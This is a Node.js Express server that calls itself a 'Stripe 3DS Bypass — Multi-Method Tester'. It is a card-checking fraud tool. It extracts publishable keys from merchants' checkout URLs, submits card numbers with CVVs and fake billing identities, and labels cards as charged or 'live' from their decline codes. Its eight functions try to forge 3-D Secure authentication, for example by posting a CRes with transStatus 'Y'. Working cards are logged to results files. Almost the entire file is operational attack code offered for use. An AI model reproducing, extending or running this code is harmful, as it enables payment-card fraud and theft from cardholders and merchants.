const express = require('express');
const axios = require('axios');
const crypto = require('crypto');
const fs = require('fs');
const path = require('path');
const { URLSearchParams } = require('url');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// ─────────────────────────────────────────────
// CONSTANTS
// ─────────────────────────────────────────────

const UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36";

const genUuid = () => {
  return crypto.randomBytes(16).toString('hex').replace(/(.{8})(.{4})(.{4})(.{4})(.{12})/, '$1-$2-$3-$4-$5');
};

// ─────────────────────────────────────────────
// HELPERS
// ─────────────────────────────────────────────

const decodePkFromUrl = (url) => {
  const result = { pk: null, cs: null };
  const csMatch = url.match(/cs_(live|test)_[A-Za-z0-9]+/);
  if (csMatch) result.cs = csMatch[0];

  if (url.includes('#')) {
    const hashPart = url.split('#')[1];
    try {
      const decodedBytes = Buffer.from(hashPart, 'base64').toString('binary');
      const xored = decodedBytes.split('').map(c => String.fromCharCode(c.charCodeAt(0) ^ 5)).join('');
      const pkMatch = xored.match(/pk_(live|test)_[A-Za-z0-9]+/);
      if (pkMatch) result.pk = pkMatch[0];
    } catch (e) {
      console.error("Decoding error:", e);
    }
  }
  return result;
};

const parseCard = (raw) => {
  const p = raw.trim().split(/[|:/\\\-\s]+/);
  if (p.length < 4) return null;
  
  const cc = p[0].replace(/\D/g, '');
  const mm = p[1].replace(/\D/g, '').padStart(2, '0');
  let yy = p[2].replace(/\D/g, '');
  const cvv = p[3].replace(/\D/g, '');

  if (yy.length === 4) yy = yy.slice(-2);
  if (!cc || cc.length < 13 || cc.length > 19) return null;
  if (!mm || parseInt(mm) < 1 || parseInt(mm) > 12) return null;
  if (yy.length !== 2) return null;
  if (cvv.length < 3 || cvv.length > 4) return null;

  return { cc, month: mm, year: yy, cvv, full: `${cc}|${mm}|${yy}|${cvv}` };
};

// ─────────────────────────────────────────────
// STRIPE SESSION MANAGER
// ─────────────────────────────────────────────

class StripeSession {
  constructor() {
    this.cs = null;
    this.pk = null;
    this.checkoutUrl = null;
  }

  async start(checkoutUrl) {
    this.checkoutUrl = checkoutUrl;
    const decoded = decodePkFromUrl(checkoutUrl);
    this.cs = decoded.cs;
    this.pk = decoded.pk;

    if (!this.cs) return { ok: false, error: "No cs_ in URL" };

    if (!this.pk) {
      // Fallback: fetch page if pk not in hash
      try {
        const res = await axios.get(checkoutUrl, { headers: { 'User-Agent': UA } });
        const match = res.data.match(/pk_(live|test)_[A-Za-z0-9]+/);
        if (match) this.pk = match[0];
      } catch (e) {
        console.error("Fetch PK failed:", e.message);
      }
    }

    if (!this.pk) return { ok: false, error: "Could not extract pk_live or pk_test" };

    // Verify by init
    try {
      const headers = {
        'Accept': 'application/json',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'https://checkout.stripe.com',
        'Referer': checkoutUrl,
        'User-Agent': UA,
        'Authorization': `Bearer ${this.pk}`,
      };
      const initBody = `key=${this.pk}&eid=NA&browser_locale=en-US&redirect_type=url`;
      const response = await axios.post(`https://api.stripe.com/v1/payment_pages/${this.cs}/init`, initBody, { headers });
      const initData = response.data;

      if (initData.error) {
        return { ok: false, error: initData.error.message || "Init failed" };
      }
      return { ok: true, data: initData };
      
    } catch (e) {
      // 🔍 التعديل المطلوب: طباعة تفاصيل الخطأ الحقيقية من Stripe
      console.error("❌ Stripe API Error Details:", e.response ? e.response.data : e.message);
      
      const stripeErrorMsg = e.response?.data?.error?.message || e.message;
      return { ok: false, error: `Stripe Refused: ${stripeErrorMsg}` };
    }
  }

  async checkAlive() {
    if (!this.cs || !this.pk) return false;
    try {
      const res = await axios.get(`https://api.stripe.com/v1/payment_pages/${this.cs}`, {
        headers: {
          'Accept': 'application/json',
          'Authorization': `Bearer ${this.pk}`,
          'User-Agent': UA,
        }
      });
      if (res.status === 200) {
        const data = res.data;
        return !(data.state === 'expired' || data.status === 'complete');
      }
      return false;
    } catch (e) {
      return false;
    }
  }
}

// ─────────────────────────────────────────────
// 8 BYPASS METHODS
// ─────────────────────────────────────────────

const buildHeaders = (pk, origin = 'https://js.stripe.com', referer = 'https://js.stripe.com/') => ({
  'Accept': 'application/json',
  'Content-Type': 'application/x-www-form-urlencoded',
  'Origin': origin,
  'Referer': referer,
  'User-Agent': UA,
});

async function method_1_app_json(pk, pi_id, client_secret, sdk_data) {
  const url = "https://api.stripe.com/v1/3ds2/authenticate";
  const app_obj = {
    sdk_trans_id: sdk_data.sdk_trans_id || genUuid(),
    device_render_options: { sdk_interface: "03", sdk_ui_type: ["01", "02", "03", "04", "05"] },
  };
  const data = new URLSearchParams({
    key: pk,
    source: sdk_data.three_d_secure_2_source || pi_id,
    app: JSON.stringify(app_obj),
    browser: JSON.stringify({ color_depth: "32" }),
  });
  const res = await axios.post(url, data, { headers: buildHeaders(pk) });
  return { name: "app as JSON string", status: res.status, body: res.data };
}

async function method_2_app_flat(pk, pi_id, client_secret, sdk_data) {
  const url = "https://api.stripe.com/v1/3ds2/authenticate";
  const data = new URLSearchParams({
    key: pk,
    source: sdk_data.three_d_secure_2_source || pi_id,
    "app[sdk_trans_id]": sdk_data.sdk_trans_id || genUuid(),
    "app[device_render_options][sdk_interface]": "03",
    "app[device_render_options][sdk_ui_type][0]": "01",
    "browser": JSON.stringify({ color_depth: "32" }),
  });
  const res = await axios.post(url, data, { headers: buildHeaders(pk) });
  return { name: "app as flat keys", status: res.status, body: res.data };
}

async function method_3_three_ds_2_response(pk, pi_id, client_secret, sdk_data) {
  const url = "https://api.stripe.com/v1/3ds2/authenticate";
  const browser_info = {
    threeDSCompInd: "Y", frictionless: "true", threeDSRequestorChallengeInd: "02",
    browserJavaEnabled: false, browserJavascriptEnabled: true, browserLanguage: "en-US",
    browserColorDepth: "24", browserTZ: "-300", browserUserAgent: UA,
  };
  const data = new URLSearchParams({
    key: pk,
    source: sdk_data.three_d_secure_2_source || pi_id,
    three_ds_2_response: JSON.stringify(browser_info),
  });
  const res = await axios.post(url, data, { headers: buildHeaders(pk) });
  return { name: "three_ds_2_response JSON", status: res.status, body: res.data };
}

async function method_4_force_cres_y(pk, pi_id, client_secret, sdk_data) {
  const url = "https://api.stripe.com/v1/3ds2/authenticate";
  const cres = {
    messageType: "CRes", messageVersion: "2.1.0",
    threeDSServerTransID: sdk_data.server_transaction_id || genUuid(),
    acsTransID: sdk_data.acs_trans_id || genUuid(),
    transStatus: "Y",
  };
  const data = new URLSearchParams({
    key: pk,
    source: sdk_data.three_d_secure_2_source || pi_id,
    three_ds_2_response: JSON.stringify(cres),
  });
  const res = await axios.post(url, data, { headers: buildHeaders(pk) });
  return { name: "force CRes transStatus=Y", status: res.status, body: res.data };
}

async function method_5_challenge_complete(pk, pi_id, client_secret, sdk_data) {
  const url = "https://api.stripe.com/v1/3ds2/challenge_complete";
  const final_cres = {
    messageType: "CRes", messageVersion: "2.1.0",
    threeDSServerTransID: sdk_data.server_transaction_id || genUuid(),
    acsTransID: sdk_data.acs_trans_id || genUuid(),
    transStatus: "Y",
  };
  const data = new URLSearchParams({
    key: pk,
    source: sdk_data.three_d_secure_2_source || pi_id,
    final_cres: JSON.stringify(final_cres),
  });
  const res = await axios.post(url, data, { headers: buildHeaders(pk) });
  return { name: "challenge_complete + final_cres", status: res.status, body: res.data };
}

async function method_6_browser_flat(pk, pi_id, client_secret, sdk_data) {
  const url = "https://api.stripe.com/v1/3ds2/authenticate";
  const data = new URLSearchParams({
    key: pk,
    source: sdk_data.three_d_secure_2_source || pi_id,
    "browser[color_depth]": "24",
    "browser[java_enabled]": "false",
    "browser[javascript_enabled]": "true",
    "browser[language]": "en-US",
    "browser[screen_height]": "1080",
    "browser[screen_width]": "1920",
    "browser[timezone_offset]": "-300",
    "browser[user_agent]": UA,
  });
  const res = await axios.post(url, data, { headers: buildHeaders(pk) });
  return { name: "browser as flat keys", status: res.status, body: res.data };
}

async function method_7_pi_retrieve(pk, pi_id, client_secret, sdk_data) {
  const endpoint = pi_id.includes("seti_") ? "setup_intents" : "payment_intents";
  const url = `https://api.stripe.com/v1/${endpoint}/${pi_id}?client_secret=${client_secret}&key=${pk}`;
  const res = await axios.get(url, { headers: { 'Accept': 'application/json', 'User-Agent': UA } });
  return { name: "PI retrieve (no auth)", status: res.status, body: res.data };
}

async function method_8_authenticate_full(pk, pi_id, client_secret, sdk_data) {
  const url = "https://api.stripe.com/v1/3ds2/authenticate";
  const browser_info = {
    java_enabled: false, javascript_enabled: true, language: "en-US",
    color_depth: 24, screen_height: 1080, screen_width: 1920,
    time_zone_offset: -300, user_agent: UA,
    accept_header: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
  };
  const data = new URLSearchParams({
    key: pk,
    source: sdk_data.three_d_secure_2_source || pi_id,
    browser: JSON.stringify(browser_info),
    three_ds_2_response: JSON.stringify({ browser: browser_info, threeDSServerTransID: sdk_data.server_transaction_id || genUuid() }),
  });
  const res = await axios.post(url, data, { headers: buildHeaders(pk) });
  return { name: "3ds2 authenticate (full flow)", status: res.status, body: res.data };
}

// ─────────────────────────────────────────────
// MAIN CHECK LOGIC
// ─────────────────────────────────────────────

async function checkOneCard(stripe_sess, card, logFn) {
  const log = (msg, type = 'info') => logFn(msg, type);

  log(`Checking Card: ${card.full}`, 'magenta');
  
  // Step 1: Init
  log("Step 1: Init Checkout", 'cyan');
  const headers = {
    'Accept': 'application/json',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'https://checkout.stripe.com',
    'Referer': stripe_sess.checkoutUrl,
    'User-Agent': UA,
    'Authorization': `Bearer ${stripe_sess.pk}`,
  };
  const initBody = `key=${stripe_sess.pk}&eid=NA&browser_locale=en-US&redirect_type=url`;
  
  let initData;
  try {
    const res = await axios.post(`https://api.stripe.com/v1/payment_pages/${stripe_sess.cs}/init`, initBody, { headers });
    initData = res.data;
  } catch (e) {
    return { status: "ERROR", message: `Init failed: ${e.message}` };
  }

  if (initData.error) {
    if (initData.error.code === 'resource_missing' || initData.error.message?.toLowerCase().includes('expired')) {
      return { status: "SESSION_EXPIRED", message: initData.error.message };
    }
    return { status: "ERROR", message: initData.error.message };
  }
  log(`Merchant: ${initData.account_settings?.display_name || 'N/A'}`, 'green');

  // Step 2: PaymentMethod
  log("Step 2: Create PaymentMethod", 'cyan');
  const checksum = initData.init_checksum || "";
  const total = initData.line_item_group?.total || initData.invoice?.total || initData.payment_intent?.amount || 0;
  const name = "John Smith";
  const email = `john_${Math.floor(Math.random() * 900 + 100)}@example.com`;
  
  const pmBody = new URLSearchParams({
    type: 'card',
    "card[number]": card.cc,
    "card[cvc]": card.cvv,
    "card[exp_month]": card.month,
    "card[exp_year]": card.year,
    "billing_details[name]": name,
    "billing_details[email]": email,
    "billing_details[phone]": "+12025551234",
    "billing_details[address][country]": "US",
    "billing_details[address][line1]": "476 West White Mountain Blvd",
    "billing_details[address][city]": "Pinetop",
    "billing_details[address][state]": "AZ",
    "billing_details[address][postal_code]": "85929",
    key: stripe_sess.pk,
    payment_user_agent: "stripe.js/f5e714652c; stripe-js-v3/f5e714652c; checkout",
    time_on_page: Math.floor(Math.random() * 30000 + 25000).toString(),
  });

  let pm;
  try {
    const res = await axios.post("https://api.stripe.com/v1/payment_methods", pmBody, { headers });
    pm = res.data;
  } catch (e) {
    return { status: "ERROR", message: `PM Failed: ${e.message}` };
  }

  if (pm.error) {
    const msg = pm.error.message || "";
    if (msg.toLowerCase().includes("captcha")) {
      return { status: "HCAPTCHA", message: "Hcaptcha Required" };
    }
    return { status: "DECLINED", message: `${pm.error.code}: ${msg}` };
  }

  const pm_id = pm.id;
  log(`PM ID: ${pm_id}`, 'green');

  // Step 3: Confirm
  log("Step 3: Confirm Payment", 'cyan');
  const confBody = new URLSearchParams({
    eid: "NA",
    payment_method: pm_id,
    expected_amount: total,
    expected_payment_method_type: "card",
    key: stripe_sess.pk,
    init_checksum: checksum,
  });

  let conf;
  try {
    const res = await axios.post(`https://api.stripe.com/v1/payment_pages/${stripe_sess.cs}/confirm`, confBody, { headers });
    conf = res.data;
  } catch (e) {
    return { status: "ERROR", message: `Confirm Failed: ${e.message}` };
  }

  if (conf.error) {
    const code = conf.error.code || "";
    const msg = conf.error.message || "";
    if (code === "resource_missing" || msg.toLowerCase().includes("expired")) {
      return { status: "SESSION_EXPIRED", message: msg };
    }
    if (msg.toLowerCase().includes("captcha")) {
      return { status: "HCAPTCHA", message: "Hcaptcha Required" };
    }
    return { status: "DECLINED", message: `${code}: ${msg}` };
  }

  const pi = conf.payment_intent || {};
  const st = pi.status || conf.status || "";
  const next_action = pi.next_action || {};
  const client_secret = pi.client_secret || "";
  const pi_id = pi.id || (client_secret.split('_secret_')[0] || "");

  log(`Status: ${st}`, 'white');

  if (st === "succeeded") {
    return { status: "CHARGED", message: "Payment succeeded" };
  }

  if (st !== "requires_action" && st !== "requires_source_action") {
    // Check if it's a "soft" decline indicating live card
    const declineCode = conf.payment_intent?.last_payment_error?.decline_code;
    const errMsg = conf.payment_intent?.last_payment_error?.message || "";
    if (["incorrect_cvc", "insufficient_funds", "incorrect_number"].includes(declineCode) || 
        /insufficient|cvc|cvv|security code/i.test(errMsg)) {
      return { status: "LIVE", message: `${declineCode}: ${errMsg}` };
    }
    return { status: "DECLINED", message: `Status: ${st}` };
  }

  // Step 4: 3DS Bypass
  log("Step 4: 3DS Bypass — Trying 8 Methods", 'orange');
  const sdk_data = next_action.use_stripe_sdk || {};
  if (!sdk_data.three_d_secure_2_source) sdk_data.three_d_secure_2_source = pi_id;

  log(`SDK Type: ${sdk_data.type || 'unknown'}`, 'grey');
  log(`3DS2 Source: ${sdk_data.three_d_secure_2_source || 'N/A'}`, 'grey');

  const methods = [
    { label: "Method 1", fn: method_1_app_json },
    { label: "Method 2", fn: method_2_app_flat },
    { label: "Method 3", fn: method_3_three_ds_2_response },
    { label: "Method 4", fn: method_4_force_cres_y },
    { label: "Method 5", fn: method_5_challenge_complete },
    { label: "Method 6", fn: method_6_browser_flat },
    { label: "Method 7", fn: method_7_pi_retrieve },
    { label: "Method 8", fn: method_8_authenticate_full },
  ];

  for (const { label, fn } of methods) {
    log(`Running ${label}...`, 'cyan');
    try {
      const { name, body } = await fn(stripe_sess.pk, pi_id, client_secret, sdk_data);
      
      // Check success
      if (body && !body.error) {
        const status = body.status || body.state || "";
        if (status === "succeeded") {
          log(`SUCCESS with ${name}`, 'green');
          return { status: "CHARGED", message: `3DS Bypassed (${name})` };
        }
      }
      
      // Log brief result
      const err = body?.error?.message || body?.message || "No error field";
      log(`${label}: ${err.substring(0, 100)}`, 'grey');
    } catch (e) {
      log(`${label} Exception: ${e.message}`, 'red');
    }
    
    await new Promise(r => setTimeout(r, 500)); // Small delay
  }

  return { status: "3DS", message: "3DS required (real, needs OTP)" };
}

// ─────────────────────────────────────────────
// API ENDPOINTS
// ─────────────────────────────────────────────

// Initialize Session
app.post('/api/init', async (req, res) => {
  const { url } = req.body;
  if (!url) return res.status(400).json({ error: "URL required" });

  const sess = new StripeSession();
  const result = await sess.start(url);

  if (!result.ok) {
    return res.status(400).json({ error: result.error });
  }

  // Store session in memory
  sessionStore.set(sess.cs, sess); 

  return res.json({
    ok: true,
    cs: sess.cs,
    pk: sess.pk,
    merchant: result.data.account_settings?.display_name || "N/A"
  });
});

// Check Card
app.post('/api/check', async (req, res) => {
  const { cs, cardRaw } = req.body;
  
  if (!cs || !cardRaw) return res.status(400).json({ error: "CS and Card required" });

  const sess = sessionStore.get(cs);
  if (!sess) return res.status(400).json({ error: "Session not found or expired. Re-init." });

  const card = parseCard(cardRaw);
  if (!card) return res.status(400).json({ error: "Invalid card format" });

  // Check if session is still alive
  const alive = await sess.checkAlive();
  if (!alive) {
    return res.status(400).json({ error: "SESSION_EXPIRED", message: "Please provide a new Checkout URL" });
  }

  const logs = [];
  const logFn = (msg, type) => {
    logs.push({ msg, type });
    console.log(`[${type.toUpperCase()}] ${msg}`);
  };

  const result = await checkOneCard(sess, card, logFn);

  // Save to file
  try {
    const dir = path.join(__dirname, 'results');
    if (!fs.existsSync(dir)) fs.mkdirSync(dir);
    
    const filename = `${result.status.toLowerCase()}.txt`;
    const filePath = path.join(dir, filename);
    fs.appendFileSync(filePath, `${card.full} | ${result.status} | ${result.message}\n`);
  } catch (e) {
    console.error("File save error:", e);
  }

  return res.json({
    status: result.status,
    message: result.message,
    logs: logs,
    card: card.full
  });
});

// Get Results
app.get('/api/results/:type', (req, res) => {
  const type = req.params.type;
  const filePath = path.join(__dirname, 'results', `${type}.txt`);
  
  if (!fs.existsSync(filePath)) {
    return res.json([]);
  }

  const data = fs.readFileSync(filePath, 'utf-8');
  const lines = data.split('\n').filter(line => line.trim());
  const results = lines.map(line => {
    const [card, status, message] = line.split(' | ');
    return { card, status, message };
  });

  res.json(results);
});

// ─────────────────────────────────────────────
// IN-MEMORY SESSION STORE
// ─────────────────────────────────────────────

const sessionStore = new Map();

// ─────────────────────────────────────────────
// START SERVER
// ─────────────────────────────────────────────

app.listen(PORT, () => {
  console.log(`
  ╔══════════════════════════════════════════════════════════════╗
  ║     Stripe 3DS Bypass — Multi-Method Tester V4               ║
  ║     Server Running on Port ${PORT}                               ║
  ╚══════════════════════════════════════════════════════════════╝
  `);
});